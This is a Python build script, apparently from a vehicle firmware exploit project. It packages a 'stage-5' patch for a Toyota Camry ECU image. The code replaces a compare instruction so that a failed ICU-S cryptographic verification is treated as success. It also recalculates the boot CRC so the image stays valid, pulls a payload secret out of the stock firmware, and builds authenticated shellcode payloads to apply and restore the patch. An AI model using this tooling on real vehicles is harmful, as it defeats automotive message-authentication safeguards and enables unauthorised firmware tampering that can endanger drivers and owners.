#!/usr/bin/env python3
"""Build exact-F33 stage-5 ICU-S crypto-result bypass package.

Stage 5 starts from the reboot-verified stage-4 image. In FUN_0008F746 the
ICU-S command-7 wrapper FUN_0008F676 returns its verify result in r10. Stock
0x8F890 `cmp r0,r10` followed by `be 0x8F8B6` permits only result zero to
continue; ordinary nonzero verify failure takes the 0x101 cleanup path before
FUN_0008F906 is ever called. Replace only the compare with same-width
`cmp r0,r0`, preserving the existing branch and native success continuation.
"""
from __future__ import annotations

import argparse
import copy
import hashlib
import json
import struct
import sys
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from exploit.patcher.build_payload import build_authenticated_payload, build_configured_payload, inject_config, sha256_bytes, simulate_apply
from exploit.patcher.patch_config import PatchConfigV1, config_from_manifest
from exploit.patcher.post_apply_verify import build_post_apply_validate_config
from tools import build_camry_f33_freshness_result_patch as stage4
from tools.build_secoc_patch_manifest import crc32

STOCK_IMAGE = stage4.STOCK_IMAGE
EXPECTED_STOCK_SHA256 = stage4.EXPECTED_STOCK_SHA256
EXPECTED_STAGE4_SHA256 = stage4.EXPECTED_FINAL_SHA256
EXPECTED_STAGE4_FIXUP = stage4.EXPECTED_STAGE4_FIXUP
EXPECTED_STAGE5_PREFIX = 0x1960380A
EXPECTED_STAGE5_FIXUP = 0xE69FC7F5
EXPECTED_FINAL_SHA256 = "669cedf8c8465ebfd02318cb7708b897b817bc3b40925c89743b64ce49aa01af"
EXPECTED_TEMPLATE_SHA256 = stage4.EXPECTED_TEMPLATE_SHA256

CRYPTO_RESULT_CMP_VA = 0x8F890
CRYPTO_RESULT_CMP_ORIGINAL = bytes.fromhex("e051")  # cmp r0,r10
CRYPTO_RESULT_CMP_REPLACEMENT = bytes.fromhex("e001")  # cmp r0,r0
PATCH_BLOCK_BASE = 0x88000
BOOT_SECRET_OFF = stage4.BOOT_SECRET_OFF
PAYLOAD_SECRET_OFF = stage4.PAYLOAD_SECRET_OFF
SECRET_LEN = stage4.SECRET_LEN
EXPECTED_F181_HEX = stage4.EXPECTED_F181_HEX
EXPECTED_BOOT_F181_HEX = stage4.EXPECTED_BOOT_F181_HEX
RAM_LOAD_ADDR = stage4.RAM_LOAD_ADDR


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _hex32(value: int) -> str:
    return f"0x{value:08X}"


def reconstruct_stage4(stock: bytes) -> tuple[bytes, dict[str, Any]]:
    if sha256(stock) != EXPECTED_STOCK_SHA256:
        raise ValueError("exact F33 stock CodeFlash SHA-256 mismatch")
    stage3_image, stage3_manifest = stage4.reconstruct_stage3(stock)
    stage4_manifest = stage4.build_stage4_manifest(stage3_image, stage3_manifest)
    cfg = config_from_manifest(stage4_manifest, mode="apply")
    stage4_image, fixup, residue = simulate_apply(stage3_image, cfg)
    if sha256(stage4_image) != EXPECTED_STAGE4_SHA256:
        raise ValueError("stage-4 reconstructed image SHA-256 drift")
    if fixup != EXPECTED_STAGE4_FIXUP or residue != 0xFFFFFFFF:
        raise ValueError("stage-4 reconstructed CRC/fixup drift")
    return stage4_image, stage4_manifest


def build_stage5_manifest(stage4_image: bytes, stage4_manifest: dict[str, Any]) -> dict[str, Any]:
    if stage4_image[CRYPTO_RESULT_CMP_VA:CRYPTO_RESULT_CMP_VA + 2] != CRYPTO_RESULT_CMP_ORIGINAL:
        raise ValueError("stage-5 ICU-S result compare preimage drift")
    expected_ctx = bytes.fromhex("fd372100233e1c00bfffeafde051a2151c306252fa05203e0202bfff14fe0ac8950d200e96ff20ce01015a0f0000bfffe4fc")
    if stage4_image[0x8F884:0x8F8B6] != expected_ctx:
        raise ValueError("stage-5 ICU-S result dispatch context drift")
    # Reuse the repository-proven RH850 Format-II CMP neutralization rule:
    # same left/right register forces equality while preserving width.
    hw = int.from_bytes(CRYPTO_RESULT_CMP_ORIGINAL, "little")
    left = hw & 31
    patched = (hw & 2047) | (left << 11)
    if patched.to_bytes(2, "little") != CRYPTO_RESULT_CMP_REPLACEMENT:
        raise ValueError("RH850 CMP same-register encoding drift")

    manifest = copy.deepcopy(stage4_manifest)
    image_sha = sha256(stage4_image)
    manifest["image"] = {"base": "0x0", "path": "CodeFlash.gate2-stage4.bin", "sha256": image_sha, "size": len(stage4_image)}
    manifest["patch"] = {
        "address": f"0x{CRYPTO_RESULT_CMP_VA:X}", "block_base": f"0x{PATCH_BLOCK_BASE:X}", "block_size": 0x8000,
        "original": CRYPTO_RESULT_CMP_ORIGINAL.hex(), "preimage_verified": True, "replacement": CRYPTO_RESULT_CMP_REPLACEMENT.hex(),
    }

    crc = manifest["boot_crc"]
    start, end, fixup_va = int(crc["start"], 0), int(crc["end"], 0), int(crc["fixup_va"], 0)
    source_prefix = crc32(stage4_image[start:fixup_va])
    source_fixup = int.from_bytes(stage4_image[fixup_va:fixup_va + 4], "little")
    source_residue = crc32(stage4_image[start:end])
    candidate = bytearray(stage4_image)
    candidate[CRYPTO_RESULT_CMP_VA:CRYPTO_RESULT_CMP_VA + 2] = CRYPTO_RESULT_CMP_REPLACEMENT
    patched_prefix = crc32(candidate[start:fixup_va])
    patched_fixup = patched_prefix ^ 0xFFFFFFFF
    struct.pack_into("<I", candidate, fixup_va, patched_fixup)
    patched_residue = crc32(candidate[start:end])
    if source_fixup != EXPECTED_STAGE4_FIXUP or source_residue != 0xFFFFFFFF:
        raise ValueError("stage-5 source is not exact CRC-valid stage-4 image")
    if patched_prefix != EXPECTED_STAGE5_PREFIX or patched_fixup != EXPECTED_STAGE5_FIXUP or patched_residue != 0xFFFFFFFF:
        raise ValueError("stage-5 cumulative CRC drift")
    if sha256(bytes(candidate)) != EXPECTED_FINAL_SHA256:
        raise ValueError("stage-5 final image SHA-256 drift")

    crc.update({
        "stock_expected_fixup": _hex32(source_fixup), "stock_prefix_crc": _hex32(source_prefix), "stock_region_valid": True,
        "stock_residue": _hex32(source_residue), "stored_fixup": _hex32(source_fixup),
        "patched_prefix_crc_for_supplied_image": _hex32(patched_prefix), "patched_fixup_for_supplied_image": _hex32(patched_fixup),
        "patched_residue_for_supplied_image": _hex32(patched_residue),
        "live_policy": "recompute cumulative CRC from exact live stage-4 image after ICU-S result-gate RMW; require residue 0xFFFFFFFF",
    })
    manifest["semantic_resolution"] = {
        "schema": "toyota-secoc-crypto-result-target-v1", "resolution": "unique", "candidate_count": 1,
        "program_sha256": image_sha, "function": {"entry": "0x0008f746", "name": "FUN_0008f746"},
        "patch": {
            "address": f"0x{CRYPTO_RESULT_CMP_VA:08x}", "operation": "force-icu-s-verify-result-equal-zero",
            "original": CRYPTO_RESULT_CMP_ORIGINAL.hex(), "replacement": CRYPTO_RESULT_CMP_REPLACEMENT.hex(),
            "stock_instruction": "cmp r0,r10", "replacement_instruction": "cmp r0,r0", "instruction_width_preserved": True,
        },
        "exact_control_flow": {
            "producer": "0x8F88C call FUN_0008F676 (FUN_00089C98 / ICU-S command 7 result in r10)",
            "success": "r10==0 -> 0x8F892 BE -> 0x8F8B6 -> FUN_0008F746 returns 0 -> caller proceeds to FUN_0008F906",
            "retry": "r10==2 -> FUN_0008F6B2(id,0x202)",
            "ordinary_failure": "other nonzero -> state 0x96, return 0x101, cleanup; FUN_0008F906 is not called",
            "patched": "cmp r0,r0 makes existing BE take the native success continuation without removing the ICU-S call",
        },
        "invariants": [
            "stage-5 source is exact reboot-verified stage-4 image", "FUN_0008F676 still executes", "only post-call result comparison is neutralized",
            "existing branch target and native success continuation are unchanged", "cumulative CRC covers all development edits",
        ],
    }
    manifest["safety"] = {"fail_closed": True, "requirements": [
        "exact stage-4 source SHA/fixup/residue match", "0x8F890 preimage and complete result-dispatch context match exactly",
        "replacement is same-width RH850 CMP neutralization", "programming-session operations only in NRTD/Park/stationary state",
    ]}
    manifest["development_stage"] = {
        "name": "f33-icu-s-result-stage5", "source_stage": "live-proven-stage4-image", "source_image_sha256": EXPECTED_STAGE4_SHA256,
        "source_fixup": _hex32(EXPECTED_STAGE4_FIXUP), "final_image_sha256": EXPECTED_FINAL_SHA256,
        "final_prefix_crc": _hex32(EXPECTED_STAGE5_PREFIX), "final_fixup": _hex32(EXPECTED_STAGE5_FIXUP),
    }
    return manifest


def materialize_template(out: Path) -> Path:
    return stage4.materialize_template(out)


def build_post_apply_payload(*, source_image: bytes, manifest: dict[str, Any], template: bytes, payload_secret: bytes, out: Path) -> dict[str, Any]:
    apply_cfg = config_from_manifest(manifest, mode="apply")
    final_image, expected_fixup, expected_residue = simulate_apply(source_image, apply_cfg)
    verify_cfg = PatchConfigV1.from_bytes(build_post_apply_validate_config(apply_cfg, final_image).to_bytes())
    shellcode = inject_config(template, verify_cfg)
    payload = build_authenticated_payload(shellcode, payload_secret, ram_load_addr=RAM_LOAD_ADDR)
    d = out / "post-apply"; d.mkdir(parents=True, exist_ok=True)
    (d / "config-validate.bin").write_bytes(verify_cfg.to_bytes()); (d / "shellcode-validate-only.bin").write_bytes(shellcode); (d / "payload-validate-only.bin").write_bytes(payload)
    start, end, fixup_va = apply_cfg.crc_start, apply_cfg.crc_end, apply_cfg.crc_fixup_va
    expected = {"patch_observed": int.from_bytes(final_image[CRYPTO_RESULT_CMP_VA:CRYPTO_RESULT_CMP_VA + 2], "little"), "fixup_stored": int.from_bytes(final_image[fixup_va:fixup_va + 4], "little"), "crc_prefix": crc32(final_image[start:fixup_va]), "crc_residue": crc32(final_image[start:end])}
    meta = {"schema": "camry-f33-stage5-post-apply-v1", "final_image_sha256": sha256(final_image), "expected_fixup": _hex32(expected_fixup), "expected_residue": _hex32(expected_residue), "expected_preflight": {k: _hex32(v) for k,v in expected.items()}, "config_sha256": sha256_bytes(verify_cfg.to_bytes()), "shellcode_sha256": sha256_bytes(shellcode), "payload_sha256": sha256_bytes(payload)}
    (d / "manifest.json").write_text(json.dumps(meta, indent=2, sort_keys=True)+"\n")
    return meta


def build(out: Path, *, build_payloads: bool = True) -> dict[str, Any]:
    out.mkdir(parents=True, exist_ok=True)
    stock = STOCK_IMAGE.read_bytes(); source, stage4_manifest = reconstruct_stage4(stock)
    source_path = out / "CodeFlash.gate2-stage4.bin"; source_path.write_bytes(source)
    manifest = build_stage5_manifest(source, stage4_manifest)
    manifest_path = out / "secoc_patch_manifest_f33_crypto_result.json"; manifest_path.write_text(json.dumps(manifest, indent=2, sort_keys=True)+"\n")
    result: dict[str, Any] = {"schema": "camry-f33-icu-s-result-stage5-package-v1", "source_image": {"path": source_path.name, "sha256": sha256(source), "size": len(source)}, "manifest": {"path": manifest_path.name, "sha256": sha256(manifest_path.read_bytes())}, "stage5": {"address": "0x8F890", "bytes": CRYPTO_RESULT_CMP_REPLACEMENT.hex(), "fixup": _hex32(EXPECTED_STAGE5_FIXUP)}, "final_image_sha256": EXPECTED_FINAL_SHA256, "expected_f181_hex": EXPECTED_F181_HEX, "expected_boot_f181_hex": EXPECTED_BOOT_F181_HEX, "payloads_built": build_payloads}
    if build_payloads:
        template_path = materialize_template(out); template = template_path.read_bytes(); payload_secret = stock[PAYLOAD_SECRET_OFF:PAYLOAD_SECRET_OFF+SECRET_LEN]
        preflight = build_configured_payload(image_path=source_path, manifest_path=manifest_path, template_path=template_path, mode="validate-only", output_path=out/"payload-validate-only.bin", payload_secret=payload_secret, software_id="8965F3307000", ram_load_addr=RAM_LOAD_ADDR)
        apply = build_configured_payload(image_path=source_path, manifest_path=manifest_path, template_path=template_path, mode="apply", output_path=out/"payload-apply.bin", payload_secret=payload_secret, restore_dir=out/"restore", software_id="8965F3307000", ram_load_addr=RAM_LOAD_ADDR)
        post = build_post_apply_payload(source_image=source, manifest=manifest, template=template, payload_secret=payload_secret, out=out)
        result["template"]={"path":template_path.name,"sha256":EXPECTED_TEMPLATE_SHA256}; result["payloads"]={"preflight":preflight["payload"],"apply":apply["payload"],"restore":apply["restore_artifact"],"post_apply":post}; result["security_access"]={"source":"exact F33 stock CodeFlash source image","offset":f"0x{BOOT_SECRET_OFF:X}","length":SECRET_LEN,"secret_value_recorded":False}
    (out/"package.json").write_text(json.dumps(result, indent=2, sort_keys=True)+"\n")
    return result


def main() -> int:
    p=argparse.ArgumentParser(description=__doc__); p.add_argument("--out",type=Path,default=ROOT/"build/out/f33-icu-s-result-stage5"); p.add_argument("--no-payloads",action="store_true"); a=p.parse_args(); print(json.dumps(build(a.out,build_payloads=not a.no_payloads),indent=2,sort_keys=True)); return 0

if __name__ == "__main__": raise SystemExit(main())
